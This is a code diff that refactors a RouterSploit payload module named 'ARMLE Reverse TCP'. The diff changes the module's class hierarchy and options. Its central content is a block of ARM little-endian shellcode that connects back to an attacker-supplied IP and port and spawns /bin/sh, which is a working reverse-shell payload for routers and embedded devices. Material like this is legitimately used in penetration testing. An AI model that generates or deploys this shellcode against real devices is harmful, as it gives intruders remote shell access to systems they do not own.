@@ -1,12 +1,12 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators,
-    random_text
+from routersploit import validators
+from routersploit.payloads import (
+    ArchitectureSpecificPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
 )
 
 
-class Exploit(payloads.Payload):
+class Exploit(ArchitectureSpecificPayload, ReverseTCPPayloadMixin):
     __info__ = {
         'name': 'ARMLE Reverse TCP',
         'authors': [
@@ -18,13 +18,7 @@ class Exploit(payloads.Payload):
         ],
     }
 
-    architecture = "armle"
-    handler = "reverse_tcp"
-    lhost = exploits.Option('', 'Connect-back IP address', validators=validators.ipv4)
-    lport = exploits.Option(5555, 'Connect-back TCP Port', validators=validators.integer)
-
-    output = exploits.Option('python', 'Output type: elf/c/python')
-    filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
+    architecture = Architectures.ARMLE
 
     def generate(self):
         reverse_ip = validators.convert_ip(self.lhost)
@@ -44,8 +38,8 @@ class Exploit(payloads.Payload):
             "\x92\x1a\x05\xb4" +
             "\x69\x46\x0b\x27" +
             "\x01\xDF\xC0\x46" +
-            "\x02\x00" + reverse_port +     # "\x12\x34" struct sockaddr and port
-            reverse_ip +                    # reverse ip address
-            "\x2f\x62\x69\x6e" +            # /bin
-            "\x2f\x73\x68\x00"              # /sh\0
+            "\x02\x00" + reverse_port +  # "\x12\x34" struct sockaddr and port
+            reverse_ip +                 # reverse ip address
+            "\x2f\x62\x69\x6e" +         # /bin
+            "\x2f\x73\x68\x00"           # /sh\0
         )
